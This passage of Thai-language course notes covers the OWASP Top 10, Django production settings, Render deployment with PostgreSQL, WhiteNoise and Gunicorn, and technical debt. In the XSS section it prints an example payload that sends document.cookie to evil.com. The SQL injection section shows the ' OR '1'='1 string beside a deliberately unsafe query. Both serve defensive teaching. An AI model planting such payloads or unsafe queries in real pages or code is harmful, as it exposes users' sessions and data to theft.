# Web Security, Production Deployment & Refactoring: OWASP Top 10, Django Hardening, Render & Release v1.0.0

> ที่มา: CN331 สัปดาห์ที่ 13 — Web Security, Production Deployment & Refactoring หน่วยที่ 1–4 และบทสรุป
>
> *จาก Local Prototype สู่ Production System: OWASP Top 10, `DEBUG = False`, HTTPS/HSTS, `check --deploy`, PostgreSQL, WhiteNoise, Gunicorn, Render และ Tag v1.0.0*
>
> เนื้อหาที่เกี่ยวข้อง: Encrypted Secrets, Bandit และ Branch Protection → ดู [07-ci-cd-and-static-analysis.md](07-ci-cd-and-static-analysis.md) · Coverage.py และ `--fail-under=80` → ดู [06-django-automated-testing.md](06-django-automated-testing.md) · Service Layer และ `@transaction.atomic` → ดู [04-django-service-layer-and-transactions.md](04-django-service-layer-and-transactions.md) · C4 Model → ดู [03-software-architecture-and-decomposition.md](03-software-architecture-and-decomposition.md) · Tech Debt และ DoD → ดู [05-agile-scrum-sprints.md](05-agile-scrum-sprints.md)

---

## ทำไมแอปพลิเคชันที่พร้อมใช้งานต้องปลอดภัยและขึ้นระบบจริงได้?

**☣️ ภาพลวงตาของ "ระบบที่รันได้บนเครื่องตัวเอง"**
- **The `DEBUG=True` Disaster**: ทันทีที่ระบบเกิด Error ข้อมูล Environment Variables, Database Credentials และโค้ดจะถูกเปิดเผยสู่สาธารณะ
- **The SQLite Concurrency Crash**: เมื่อผู้ใช้เข้าพร้อมกันหลายสิบคน ฐานข้อมูล SQLite จะล็อกทั้งไฟล์ (`Database is locked`) จนระบบค้าง
- **Missing Static Files**: เมื่อปิด Debug หน้าเว็บจะกลายเป็นโครงเปลือยไม่มี CSS และ JS เพราะเซิร์ฟเวอร์ไม่ได้ตั้งค่า Static Serving

**🔒 ความสมบูรณ์แบบระดับวิศวกรรม (Production Readiness)**
- **Defense in Depth**: ระบบได้รับการปกป้องหลายชั้น ทั้งระดับ Network, Framework Middlewares, Database และ Security Headers
- **Scalable Cloud Infrastructure**: ใช้งาน WSGI Server (Gunicorn) ร่วมกับ Managed PostgreSQL ที่รองรับการทำงานพร้อมกันได้เสถียร
- **Reproducible Deployments**: การขึ้นระบบทำได้อัตโนมัติผ่าน Git Push พร้อมการตรวจสอบความปลอดภัยที่รัดกุม

> 💡 **Takeaway** — **Software Engineering Truth**: ซอฟต์แวร์ที่ยังไม่ถูก Deploy สู่ Production และยังไม่ผ่านการทดสอบความปลอดภัย ไม่สามารถนับว่าเป็น "ผลิตภัณฑ์ที่ส่งมอบได้จริง" (Shippable Product)

---

# หน่วยที่ 1: รากฐานความปลอดภัยเว็บและการรับมือ OWASP Top 10

*ทำความเข้าใจภัยคุกคามทางไซเบอร์ที่พบบ่อย: SQL Injection, XSS, CSRF, Clickjacking และการป้องกันด้วย Django*

## มาตรฐานความปลอดภัย OWASP Top 10 สำคัญอย่างไร?

**Open Web Application Security Project (OWASP)** สรุป 10 อันดับความเสี่ยงด้านความปลอดภัยของเว็บแอปพลิเคชันที่เป็นสากล:

- **A01: Broken Access Control**: การไม่ตรวจสอบสิทธิ์ให้รัดกุม ผู้ใช้เข้าถึงข้อมูลของผู้อื่นได้
- **A02: Cryptographic Failures**: การรั่วไหลของข้อมูลความลับ การเก็บรหัสผ่านไม่ปลอดภัย
- **A03: Injection (เช่น SQLi)**: การส่งคำสั่งแปลกปลอมเข้าไปปนกับข้อมูลคำสั่ง
- **A07: Identification and Authentication Failures**: ช่องโหว่ระบบล็อกอินและเซสชัน

```
External Threat Actor      → Malicious Payloads, Script Injection
        ↓
Django Security Shields    → CSRF Token, ORM Escaping, PBKDF2 Password Hash, Security Middleware
        ↓
Protected Domain Data      → Encrypted, Authorized Access Only
```

> 💡 **Takeaway** — **Secure by Default**: Django ถูกออกแบบตามปรัชญา "Secure by Default" ซึ่งมีระบบป้องกันภัยคุกคามฝังมาในระดับสถาปัตยกรรม เว้นแต่นักพัฒนาจะจงใจปิดการทำงาน

## การป้องกันการโจมตีแบบ SQL Injection (SQLi)

**SQL Injection** เกิดขึ้นเมื่อโปรแกรมนำข้อความที่ผู้ใช้กรอกมาต่อสตริง (String Concatenation) เข้าสู่ประโยคคำสั่ง SQL โดยตรง:

- ผู้โจมตีกรอกข้อความเช่น `' OR '1'='1` เพื่อข้ามระบบตรวจสอบ
- **การป้องกันของ Django**: Django ORM ใช้เทคนิค **Parameterized Queries** เสมอ ข้อมูลนำเข้าจะถูกส่งแยกจากคำสั่ง SQL ทำให้ตัวแปรถูกมองเป็น Data เสมอ ไม่มีทางถูกตีความเป็น Command

```python
# DANGEROUS: String formatting in raw queries!
# Input: "student' OR '1'='1"
cursor.execute(f"SELECT * FROM users WHERE username = '{name}'")

# SAFE: Django ORM parameterizes automatically!
user = User.objects.filter(username=name).first()

# SAFE: Parameterized Raw SQL (if raw needed)
cursor.execute(
    "SELECT * FROM users WHERE username = %s",
    [name]
)
```

> 💡 **Takeaway** — **Avoid Raw Queries**: หลีกเลี่ยงการใช้คำสั่ง SQL ดิบ ให้ใช้ Django ORM API เสมอเพื่อรับประกันความปลอดภัยจากการโจมตี SQL Injection

## การป้องกัน Cross-Site Scripting (XSS) และกับดักของตัวกรอง `|safe`

**XSS** เกิดขึ้นเมื่อผู้โจมตีลักลอบฝังโค้ด JavaScript ที่เป็นอันตรายลงในระบบ เพื่อให้สคริปต์ไปรันบนเบราว์เซอร์ของผู้ใช้รายอื่นที่เปิดดูหน้าเว็บ:

- โค้ดสามารถขโมย Cookie, Session Token หรือปลอมคำสั่ง
- **Django Auto-escaping**: Template Engine แปลงอักขระพิเศษใน HTML เป็น Entity อัตโนมัติ เช่น `<` กลายเป็น `&lt;`
- **The Fatal Mistake: Filter `|safe`**: การใส่ `{{ bio|safe }}` จะสั่งให้ Django ปิดระบบ Auto-escaping ซึ่งเปิดประตูให้ผู้ไม่หวังดีทันที

```html
<!-- Attacker payload in user bio: -->
<script>
  fetch('https://evil.com/steal?c=' + document.cookie);
</script>

<!-- SAFE: Django escapes by default -->
<p>{{ student.bio }}</p>
<!-- Output: &lt;script&gt;... Plain text, not executed! -->

<!-- DANGEROUS: Never do this on raw user input! -->
<p>{{ student.bio|safe }}</p>
<!-- Script executes in victim's browser! -->
```

> 💡 **Takeaway** — **Never Trust User Input**: อย่าใช้ `|safe` หรือ `mark_safe()` กับข้อความที่รับมาจากผู้ใช้ภายนอกโดยเด็ดขาด เว้นแต่จะ Sanitized ด้วยไลบรารีอย่าง `bleach`

## การป้องกัน Cross-Site Request Forgery (CSRF)

**CSRF** คือการที่เว็บมุ่งร้ายหลอกให้เบราว์เซอร์ของเหยื่อส่งคำสั่ง (เช่น POST เปลี่ยนรหัสผ่าน) ไปยังเว็บของเหยื่อที่ยังล็อกอินค้างอยู่:

- เบราว์เซอร์จะแนบ Session Cookie ไปอัตโนมัติ ทำให้เซิร์ฟเวอร์หลงเชื่อว่าเป็นคำสั่งจากผู้ใช้จริง
- **Django CSRF Token Protection**: เซิร์ฟเวอร์สร้างโทเค็นลับเฉพาะตัว ทุกฟอร์ม POST ต้องมีแท็ก `{% csrf_token %}`
- `CsrfViewMiddleware` จะปฏิเสธคำสั่ง POST ทันทีหากไม่มีโทเค็นที่ถูกต้องตรงกับ Cookie

```html
<!-- courses/templates/courses/enroll_form.html -->
<form method="POST" action="{% url 'enroll' %}">
  {% csrf_token %} <!-- Mandatory Token -->
  <input type="hidden" name="course_id" value="42">
  <button type="submit">Confirm Enrollment</button>
</form>
<!-- AJAX: 'X-CSRFToken': getCookie('csrftoken') -->
```

> 💡 **Takeaway** — **CSRF Token Mandatory**: ทุกคำสั่ง POST, PUT, DELETE ที่เปลี่ยนแปลงสถานะของระบบต้องมี CSRF Token กำกับเสมอ ห้ามใส่ `@csrf_exempt` พร่ำเพรื่อ

## QUICK CHECK: Cross-Site Scripting (XSS) Prevention

*(สไลด์ไม่มีเนื้อหาคำถาม)*

## QUICK CHECK: CSRF Middleware Functionality

*(สไลด์ไม่มีเนื้อหาคำถาม)*

---

# หน่วยที่ 2: การล็อกความปลอดภัย Django และ Checklist ตรวจสอบ

*การปรับแต่งไฟล์ `settings.py` สำหรับ Production, การบังคับใช้ HTTPS/SSL, Cookies Security และการตรวจสอบด้วย `manage.py check --deploy`*

## ทำไม `DEBUG = False` จึงเป็นกฎเหล็กที่ละเมิดไม่ได้?

ในขั้นตอนการพัฒนา (Development) ตัวแปร `DEBUG = True` มีประโยชน์มากในการดู Error Traceback แต่บน Production ถือเป็น **หายนะขั้นวิกฤต**:

- **Information Disclosure**: เมื่อเกิด Exception หน้า Error Page ของ Django จะเปิดเผย:
  - รหัสผ่านและ Secret Keys ในตัวแปร Environment
  - โครงสร้าง Source Code บรรทัดต่อบรรทัด
  - ประวัติคำสั่ง SQL และ Schema ของตาราง
- **Memory Leaks**: Django จะเก็บประวัติคำสั่ง SQL ใน RAM ทุกคำสั่งเพื่อแสดงผล เมื่อมีทราฟฟิกจริงจะเกิดอาการ OOM Crash ทันที

**⚠️ Production Rule** — เมื่อตั้งค่า `DEBUG = False` Django บังคับให้ต้องระบุรายชื่อโดเมนในตัวแปร `ALLOWED_HOSTS` เสมอ เพื่อป้องกัน **Host Header Attack**

```python
# config/settings.py
DEBUG = os.environ.get("DEBUG", "False").lower() == "true"
ALLOWED_HOSTS = [
    "cn331-portal.onrender.com",
    "localhost", "127.0.0.1",
]
```

> 💡 **Takeaway** — **Absolute Requirement**: โครงงานของทุกกลุ่มที่จะนำส่งและทดสอบในสัปดาห์ที่ 14 จะต้องทำงานบนสภาวะ `DEBUG = False` เท่านั้น

## การตั้งค่า HTTPS, SSL และความปลอดภัยของ Cookies

การเข้ารหัสข้อมูลขณะส่งผ่านเครือข่ายเป็นมาตรฐานบังคับของเว็บยุคใหม่:

- **`SECURE_SSL_REDIRECT`**: เปลี่ยนการเชื่อมต่อ HTTP ทั้งหมดให้เป็น HTTPS อัตโนมัติ
- **`SESSION_COOKIE_SECURE`**: เบราว์เซอร์จะส่ง Session Cookie เฉพาะผ่าน HTTPS เท่านั้น (ป้องกัน Man-in-the-Middle)
- **`CSRF_COOKIE_SECURE`**: ส่ง CSRF Cookie ผ่าน HTTPS เท่านั้น
- **`SECURE_HSTS_SECONDS`**: สั่งให้เบราว์เซอร์จดจำว่าจะเข้าเว็บนี้ผ่าน HTTPS เท่านั้นในอนาคต (HSTS)

```python
# config/settings.py (Production Hardening)
if not DEBUG:
    SECURE_SSL_REDIRECT = True
    SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
    SESSION_COOKIE_SECURE = True
    CSRF_COOKIE_SECURE = True
    SESSION_COOKIE_HTTPONLY = True
    SECURE_HSTS_SECONDS = 31536000  # 1 year
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True
    SECURE_HSTS_PRELOAD = True
    X_FRAME_OPTIONS = 'DENY'
```

> 💡 **Takeaway** — **Header Hardening**: การเปิดใช้งาน Security Headers ช่วยป้องกันการขโมย Session จากเครือข่ายสาธารณะและบล็อกการดักฟังข้อมูล

## การตรวจสอบความพร้อมด้วยคำสั่ง: `manage.py check --deploy`

Django มีเครื่องมือตรวจสอบความปลอดภัยในตัวที่ทรงพลังมาก:

- รันคำสั่งตรวจสอบก่อนนำขึ้น Cloud เสมอ: `python manage.py check --deploy`
- ระบบจะสแกนไฟล์ `settings.py` และแจ้งเตือนจุดบกพร่อง:
  - เตือนหาก `SECRET_KEY` สั้นหรือไม่ปลอดภัย
  - เตือนหากยังไม่ได้เปิด `SESSION_COOKIE_SECURE`
  - เตือนหากไม่มีการกำหนด `SECURE_HSTS_SECONDS`
- เป้าหมายคือรายงานว่า **"System check identified no issues"**

**ตัวอย่างผลลัพธ์การตรวจสอบ**

```
?: (security.W004) You have not set SECURE_HSTS_SECONDS.
?: (security.W012) SESSION_COOKIE_SECURE is not set to True.
?: (security.W018) You should not have DEBUG = True in production.

System check identified 3 issues (0 silenced).
```

> 💡 **Takeaway** — **Audit Command**: รันคำสั่ง `check --deploy` เป็นขั้นตอนสุดท้ายในเครื่องคอมพิวเตอร์ก่อนทำการ Push โค้ดขึ้นสู่เซิร์ฟเวอร์จริง

## QUICK CHECK: Django Production Security Checklist

*(สไลด์ไม่มีเนื้อหาคำถาม)*

## QUICK CHECK: Impact of `DEBUG=False` on `ALLOWED_HOSTS`

*(สไลด์ไม่มีเนื้อหาคำถาม)*

---

# หน่วยที่ 3: การนำระบบขึ้นสู่ Cloud Production

*สถาปัตยกรรม WSGI Gunicorn, การเปลี่ยนสู่ PostgreSQL, การจัดการ Static Files ด้วย WhiteNoise และการตั้งค่าบน Render/Heroku*

## สถาปัตยกรรมเว็บแอปพลิเคชันระดับ Production (Production Architecture)

ใน Development เราอาจสั่ง `runserver` เพื่อความสะดวก แต่บน Production ต้องจัดสถาปัตยกรรมเป็นเลเยอร์เพื่อประสิทธิภาพและความเสถียร:

1. **Cloud Router / Reverse Proxy**: รับคำขอจากผู้ใช้, จัดการ SSL/TLS Termination, ป้องกัน DDoS
2. **WSGI Application Server (Gunicorn)**: สร้าง Worker Processes หลายตัวเพื่อประมวลผลคำขอพร้อมกัน
3. **Static Assets Engine (WhiteNoise)**: เสิร์ฟไฟล์ CSS, JS และรูปภาพ พร้อมบีบอัดและ Cache Headers
4. **Managed PostgreSQL Database**: ระบบฐานข้อมูลระดับ Enterprise ที่แยกเซิร์ฟเวอร์ต่างหากและมี Backup

```
Clients / Browsers               → HTTPS Requests
        ↓
Cloud Router / TLS               → Port 443 → Gunicorn
        ↓
Gunicorn (WSGI) + WhiteNoise     → Django Application Workers
        ↓
Managed PostgreSQL               → Persistent DB Storage
```

> 💡 **Takeaway** — **Production Stack**: โปรเจกต์ CN331 จะใช้แพ็กเกจ **Gunicorn + WhiteNoise + PostgreSQL** บนแพลตฟอร์ม Cloud (Render หรือ Heroku)

## การเตรียมแพ็กเกจสำหรับ Production (`requirements.txt`)

ก่อนนำโค้ดขึ้นระบบคลาวด์ ต้องติดตั้ง 4 แพ็กเกจพื้นฐานสำหรับสภาพแวดล้อมจริง:

| แพ็กเกจ | หน้าที่ |
|---|---|
| **gunicorn** | WSGI HTTP Server มาตรฐานสำหรับประมวลผลคำขอบน Linux |
| **psycopg2-binary** | ไดรเวอร์เชื่อมต่อระหว่าง Django ORM กับ PostgreSQL |
| **dj-database-url** | ยูทิลิตี้แปลงค่า `DATABASE_URL` เข้าสู่อ็อบเจกต์ `DATABASES` |
| **whitenoise** | มิดเดิลแวร์สำหรับเสิร์ฟไฟล์ Static (CSS/JS) โดยตรงจากแอปพลิเคชัน |

**ข้อพึงระวัง**: หากไม่รันคำสั่ง `freeze` แพลตฟอร์ม Cloud จะไม่ทราบว่าต้องลงแพ็กเกจใด และการ Build จะล้มเหลวทันที

```bash
# 1. Install production packages
pip install gunicorn psycopg2-binary dj-database-url whitenoise

# 2. Freeze dependencies
pip freeze > requirements.txt

# Sample requirements.txt:
# django==5.1.2
# gunicorn==23.0.0
# psycopg2-binary==2.9.10
# dj-database-url==2.3.0
# whitenoise==6.8.2
```

> 💡 **Takeaway** — **Dependency Contract**: Render จะอ่าน `requirements.txt` เพื่อสร้าง Environment อัตโนมัติ หากลืม Freeze โค้ดจะ Build ไม่ผ่าน (`ModuleNotFoundError`)

## การเปลี่ยนผ่านสู่ Managed PostgreSQL ด้วย `dj-database-url`

**ทำไมต้องเลิกใช้ SQLite บน Cloud?**
- บนคลาวด์แบบ PaaS พื้นที่จัดเก็บเป็นแบบ **Ephemeral** (เมื่อเซิร์ฟเวอร์ Restart ข้อมูล SQLite จะถูกรีเซ็ตหายทั้งหมด!)
- SQLite ล็อกทั้งไฟล์เมื่อเขียนข้อมูล รองรับ Concurrency พร้อมกันได้จำกัด

**วิธีแก้ปัญหา**: ปรับแต่ง `settings.py` ให้เชื่อมต่อ PostgreSQL ผ่านตัวแปร `DATABASE_URL` แต่ fallback เป็น SQLite เมื่อรันในเครื่อง Local

```python
# config/settings.py
import dj_database_url

# Default to SQLite locally,
# use PostgreSQL on Cloud via DATABASE_URL
DATABASES = {
    "default": dj_database_url.config(
        default="sqlite:///db.sqlite3",
        conn_max_age=600,  # Connection pooling
        conn_health_checks=True,
    )
}
# DATABASE_URL structure:
# postgresql://user:pass@host:5432/dbname
```

> 💡 **Takeaway** — **Stateless Application**: เซิร์ฟเวอร์ของแอปพลิเคชันต้องไม่มีสถานะ (Stateless) และเก็บข้อมูลถาวรทั้งหมดไว้ใน Managed Database ภายนอกเท่านั้น

## การเสิร์ฟไฟล์สถิต (Static Files) ด้วย WhiteNoise

เมื่อ `DEBUG = False` คำสั่ง `runserver` จะปิดระบบเสิร์ฟ Static Files ภายในทันที:

- **WhiteNoise** ทำหน้าที่เสิร์ฟไฟล์ Static โดยตรงผ่าน WSGI โดยไม่ต้องพึ่ง Web Server ภายนอก
- บีบอัดไฟล์ (Gzip / Brotli) อัตโนมัติเพื่อประหยัด Bandwidth
- **Far-future Caching**: ฝัง Hash ในชื่อไฟล์ (เช่น `app.1a2b3c.css`) และสั่ง Cache 1 ปี หากโค้ดเปลี่ยน Hash จะเปลี่ยน ป้องกันปัญหาแคชค้าง

```python
# config/settings.py
MIDDLEWARE = [
    "django.middleware.security.SecurityMiddleware",
    "whitenoise.middleware.WhiteNoiseMiddleware",  # Right after Security
    # ... other middlewares ...
]
STATIC_URL = "/static/"
STATIC_ROOT = BASE_DIR / "staticfiles"
STORAGES = {
    "staticfiles": {
        "BACKEND": "whitenoise.storage.CompressedManifestStaticFilesStorage",
    },
}
```

> 💡 **Takeaway** — **Build Requirement**: ในขั้นตอนการสร้างแอปพลิเคชันบน Cloud ต้องสั่งรันคำสั่ง `python manage.py collectstatic --noinput` เสมอ

## การตั้งค่าความปลอดภัยสำหรับ Cloud ใน `settings.py`

เมื่อระบบขึ้นสู่ Cloud และรันด้วย HTTPS ต้องระบุการยอมรับ Host และ Origin:

- **`ALLOWED_HOSTS`**: ป้องกัน Host Header Attack โดยกำหนดโดเมน เช่น `'.onrender.com'`
- **`CSRF_TRUSTED_ORIGINS`**: บังคับใช้ใน Django 4/5 สำหรับฟอร์ม POST ผ่าน HTTPS เพื่อป้องกันข้อผิดพลาด **HTTP 403 Forbidden**
- **`DEBUG` / `SECRET_KEY`**: อ่านค่าความลับจากตัวแปรสภาพแวดล้อม (Env Vars)

```python
# config/settings.py
import os

DEBUG = os.environ.get("DEBUG", "False").lower() == "true"
SECRET_KEY = os.environ.get(
    "SECRET_KEY", "fallback-dev-insecure-key"
)

# Cloud domain whitelist
ALLOWED_HOSTS = [".onrender.com", "localhost", "127.0.0.1"]

# Required for HTTPS POST on Django 4/5
CSRF_TRUSTED_ORIGINS = ["https://*.onrender.com"]
```

> 💡 **Takeaway** — **CSRF on HTTPS**: หากไม่กำหนด `CSRF_TRUSTED_ORIGINS` ฟอร์ม POST และหน้าล็อกอินบน Cloud จะถูกปฏิเสธด้วยรหัส HTTP 403 ทั้งหมด

## การสร้างสคริปต์ขึ้นระบบอัตโนมัติ: `build.sh` และ `Procfile`

บน Cloud PaaS เราต้องเตรียมไฟล์สำหรับกระบวนการ Build และ Start ไว้ที่ Root Directory:

- **Build Script (`build.sh`)**: รวมคำสั่งติดตั้งและเตรียมระบบ คำสั่ง `set -o errexit` จะสั่งหยุดทันทีหากมี Error เพื่อไม่ให้เซิร์ฟเวอร์เปิดใช้งานในสภาพที่ไม่สมบูรณ์
- **Process File (`Procfile`)**: กำหนดคำสั่งสำหรับเปิด Web Process ด้วย WSGI Server (Gunicorn)
- **Executable Permission**: ต้องให้สิทธิ์รันสคริปต์ด้วย `chmod a+x build.sh` ก่อน Commit เข้า Git

```bash
# build.sh (Project root script)
#!/usr/bin/env bash
set -o errexit  # Exit immediately on error

pip install -r requirements.txt
python manage.py collectstatic --noinput
python manage.py migrate
```

```
# Procfile (Process definition)
web: gunicorn config.wsgi:application

# Make script executable:
# chmod a+x build.sh
```

> 💡 **Takeaway** — **Automated Pipeline**: `build.sh` รับประกันว่าทุกครั้งที่มีการ Deploy ไฟล์ Static จะถูกอัปเดตและโครงสร้างฐานข้อมูลจะถูก Migrate ให้พร้อมเสมอ

## ขั้นตอนที่ 1 บน Render: การสร้าง Managed PostgreSQL Database

ขั้นตอนการสร้างฐานข้อมูลระดับองค์กรบน Render Dashboard:

1. คลิกปุ่ม **New +** ที่มุมขวาบน → เลือก **PostgreSQL**
2. **Name**: ตั้งชื่ออ้างอิง เช่น `portal-db`
3. **Database & User**: กำหนดชื่อฐานข้อมูลและผู้ใช้งาน
4. **Region**: เลือก **Singapore (Southeast Asia)** เพื่อลด Network Latency ให้ต่ำที่สุดสำหรับผู้ใช้ในประเทศไทย (< 35 ms)
5. **Instance Type**: เลือกแพ็กเกจ **Free**
6. คลิกปุ่ม **Create Database** และรอจนสถานะเป็น Available

**ความแตกต่างของ Connection URLs บน Render**

| URL | รูปแบบ | ใช้เมื่อ |
|---|---|---|
| **Internal Database URL** (ใช้สำหรับ Web Service) | `postgres://user:pass@dpg-...:5432/db` | สื่อสารผ่านเครือข่ายภายในความเร็วสูงของ Render · **ปลอดภัยสูงสุด**, ไม่เสีย Bandwidth ภายนอก, ป้องกันเน็ตหลุด |
| **External Database URL** (ใช้ภายนอก) | มีโดเมนภายนอก: `...singapore-postgres.render.com` | ใช้เปิดจาก DBeaver หรือรัน Migration จากเครื่องนักศึกษา |

> 💡 **Takeaway** — **Internal Network**: สำหรับ Web Service ต้องคัดลอก **Internal Database URL** ไปใช้งานเสมอ เพื่อความเร็วสูงสุดและความปลอดภัยระดับเครือข่ายปิด

## ขั้นตอนที่ 2 บน Render: การสร้าง Web Service เชื่อมกับ GitHub

ขั้นตอนการผูก Web Service เข้ากับ Git Repository ของทีม:

1. คลิก **New +** → เลือก **Web Service**
2. **Connect Repository**: ค้นหาและเลือก GitHub Repo ของกลุ่ม
3. **Name**: ตั้งชื่อเว็บ เช่น `cn331-portal` (จะได้ URL `cn331-portal.onrender.com`)
4. **Region**: เลือก **Singapore** (ต้องตรงกับ Region ของ PostgreSQL ที่สร้างไว้ในขั้นตอนที่ 1)
5. **Branch**: เลือกกิ่งส่งมอบงานหลัก (`main`)
6. **Runtime**: เลือกสภาพแวดล้อม **Python 3**

**Build and Start Commands Configuration** — กำหนดคำสั่งการทำงานของ Container:

| ช่อง | ค่า | หมายเหตุ |
|---|---|---|
| **Build Command** | `./build.sh` | เรียกสคริปต์ติดตั้ง Library, รวม Static และรัน Migrate |
| **Start Command** | `gunicorn config.wsgi:application` | คำสั่งเปิดเครื่อง WSGI Server |
| **Instance Type** | Free | |
| **Auto-Deploy** | Yes | เปิดใช้งาน CI/CD ทุกครั้งที่กิ่ง `main` มีการอัปเดต |

> 💡 **Takeaway** — **Co-location Rule**: Web Service และ PostgreSQL ต้องตั้งอยู่ที่ Region เดียวกัน (**Singapore**) เสมอ มิฉะนั้นจะไม่สามารถเชื่อมต่อ Internal URL ได้

## ขั้นตอนที่ 3 บน Render: การกำหนดค่า Environment Variables

ตามหลักการ **Twelve-Factor App** ข้อมูลความลับและการตั้งค่าระบบต้องส่งผ่าน Environment Variables:

- เปิดแท็บ **Environment** บน Dashboard ของ Web Service
- คลิกปุ่ม **Add Environment Variable** เพื่อเพิ่มค่าตัวแปรทีละแถว
- ในช่อง `DATABASE_URL` ให้นำค่า **Internal Database URL** จากขั้นตอนที่ 1 มาวาง
- สามารถตั้งค่า `DJANGO_SUPERUSER_PASSWORD` เพื่อใช้สร้าง Admin อัตโนมัติ

**รายการตัวแปรสภาพแวดล้อมที่จำเป็น (Required Env Vars)**

| Key | Value ที่ต้องระบุ |
|---|---|
| `PYTHON_VERSION` | `3.12.0` |
| `DEBUG` | `False` |
| `SECRET_KEY` | สตริงสุ่มยาว 50+ ตัวอักษร (ห้ามใช้ค่า default) |
| `DATABASE_URL` | **Internal Database URL** ของ PostgreSQL |
| `ALLOWED_HOSTS` | `.onrender.com` |
| `CSRF_TRUSTED_ORIGINS` | `https://*.onrender.com` |
| `DJANGO_SUPERUSER_PASSWORD` | รหัสผ่านสำหรับ Admin บัญชีแรก |

> 💡 **Takeaway** — **Zero Secrets in Git**: ค่า `SECRET_KEY` และรหัสผ่านทั้งหมดต้องไม่อยู่ใน Git แต่ต้องถูกตั้งค่าอย่างปลอดภัยบน Cloud Dashboard เท่านั้น

## ขั้นตอนที่ 4 บน Render: การตรวจสอบ Logs และเปิดใช้งานระบบจริง

**1. ตรวจสอบกระบวนการ Deploy ผ่าน Logs**
- เปิดแท็บ **Events / Logs** บน Render
- ตรวจสอบ Build Logs: ยืนยันว่า `pip install`, `collectstatic` และ `migrate` ผ่านครบ 100%
- ตรวจสอบ Deploy Logs: สังเกตข้อความ `Listening at: http://0.0.0.0:10000` และสถานะ **"Your service is live"**

**2. ทดสอบเข้าชมหน้าแรก**: คลิก URL ของโปรเจกต์ เช่น `https://portal.onrender.com`

**สิ่งที่ต้องตรวจสอบเมื่อเปิดหน้าเว็บครั้งแรก**
- **HTTPS / SSL Status**: สัญลักษณ์กุญแจล็อกแสดงว่า Cloud Router ออกใบรับรอง TLS ให้เรียบร้อย
- **Static Assets Check**: ตรวจสอบว่ารูปภาพ, CSS และ Font โหลดได้ครบถ้วน (รหัส HTTP 200) ไม่เกิด 404
- **Status Code**: หน้าเว็บตอบกลับด้วย HTTP 200 OK ไม่แสดงข้อผิดพลาด Server Error (500)

> 💡 **Takeaway** — **Deploy Health**: ตรวจสอบ Deploy Logs ให้ขึ้นสถานะ **"Your service is live"** และหน้าแรกแสดงผล CSS ครบถ้วนก่อนดำเนินการขั้นต่อไป

## ขั้นตอนที่ 5 บน Render: การสร้าง Superuser ด้วย Password จาก ENV

**กลไก Non-interactive Superuser ใน Django**
- เมื่อระบุแฟล็ก `--noinput` ตัว Django จะอ่านรหัสผ่านจากตัวแปร `DJANGO_SUPERUSER_PASSWORD` ใน ENV โดยอัตโนมัติ
- **ข้อดีด้านความปลอดภัย**: ไม่ต้องพิมพ์รหัสผ่านสดบน Web Shell ป้องกันการรั่วไหลขณะนำเสนอผลงาน
- **DevOps Automation**: นำไปใส่ในสคริปต์ `build.sh` พร้อมคำสั่ง `|| true` เพื่อไม่ให้การ Deploy Error เมื่อมีบัญชีแอดมินอยู่แล้ว
- หลังสร้างเสร็จ ให้ทดสอบล็อกอินที่ `/admin/`

```bash
# Method 1: Run in Render Shell tab
python manage.py createsuperuser \
  --noinput --username admin \
  --email admin@example.com

# Method 2: Auto-run in build.sh on deploy
if [ "$DJANGO_SUPERUSER_PASSWORD" ]; then
  python manage.py createsuperuser \
    --noinput --username admin \
    --email admin@example.com || true
fi
```

> 💡 **Takeaway** — **ENV Provisioning**: การใช้ `DJANGO_SUPERUSER_PASSWORD` ร่วมกับ `--noinput` ช่วยให้สร้างบัญชีผู้ดูแลระบบได้อย่างปลอดภัยโดยไม่ต้องพิมพ์รหัสผ่านผ่านเทอร์มินัล

## QUICK CHECK: Ephemeral Storage and SQLite on Cloud

*(สไลด์ไม่มีเนื้อหาคำถาม)*

## QUICK CHECK: Serving Static Files in Production

*(สไลด์ไม่มีเนื้อหาคำถาม)*

---

# หน่วยที่ 4: การชำระหนี้ทางเทคนิค และการปล่อยตัว Final Release

*การบริหาร Technical Debt, การทำ Refactoring โค้ด, การปิดรอบ Sprint 3 และการติด Tag v1.0.0 สำหรับ Final Presentation*

## การบริหารจัดการหนี้ทางเทคนิค (Managing Technical Debt)

แนวคิดเชิงอุปมาของ Ward Cunningham: **"Technical Debt"** อธิบายถึงการเลือกวิธีเขียนโค้ดแบบทางลัดที่รวดเร็วแต่ขาดคุณภาพ เพื่อเร่งให้ฟีเจอร์เสร็จทันกำหนด:

- การเป็นหนี้ทำให้เราไปได้เร็วในระยะสั้น
- แต่ต้องจ่าย **"ดอกเบี้ย (Interest)"** เป็นความยากลำบากในการแก้โค้ดและบั๊กที่โผล่มาเรื่อยๆ
- หากไม่ชำระหนี้ (Refactoring) ดอกเบี้ยจะท่วมจนทีมไม่สามารถพัฒนาฟีเจอร์ใหม่ได้อีกต่อไป

```
Accumulated Technical Debt   → Spaghetti code, duplicated logic, dead imports
        ↓
Sprint 3 Refactoring         → Extract services, clean views, fix Flake8
        ↓
High Maintainability         → Clean Release v1.0.0
```

> 💡 **Takeaway** — **Pay the Debt in Sprint 3**: สปรินต์นี้ทีมต้องแบ่งเวลาอย่างน้อย 30% ของ Story Points เพื่อทำ Refactoring และชำระหนี้ทางเทคนิคก่อนการนำเสนอผลงาน

## เอกสารประกอบระบบระดับมืออาชีพ (`README.md` & API Docs)

หนึ่งในเกณฑ์การให้คะแนนสำคัญของโครงงาน CN331 คือความสมบูรณ์ของไฟล์ `README.md`:

- **System Overview**: ชื่อระบบ วัตถุประสงค์ และสมาชิก
- **Live Demo Link**: URL ระบบจริงที่รันบน Render
- **Architecture**: ไดอะแกรม C4 Container และ ERD
- **Local Setup**: คำสั่งติดตั้งและ Run Migrations
- **Test Execution**: คำสั่งการรันเทสและสรุป Coverage

```markdown
# Academic Portal (CN331 Capstone)
[![CI](https://github.com/cpe/portal/actions/workflows/ci.yml/badge.svg)](...)
## Live Production: https://cn331-portal.onrender.com
## Local Setup
$ git clone https://github.com/cpe/portal.git && cd portal
$ python -m venv .venv && source .venv/bin/activate
$ pip install -r requirements.txt
$ python manage.py migrate && python manage.py runserver
## Test & Coverage
$ coverage run --source='.' manage.py test
$ coverage report -m --fail-under=80
```

> 💡 **Takeaway** — **Engineering Polish**: README ที่ชัดเจนและเป็นระเบียบจะสร้างความประทับใจแรกให้กับผู้ตรวจและสะท้อนถึงมาตรฐานความเป็นวิศวกร

## การออก Release อย่างเป็นทางการ: Semantic Versioning & Git Tags

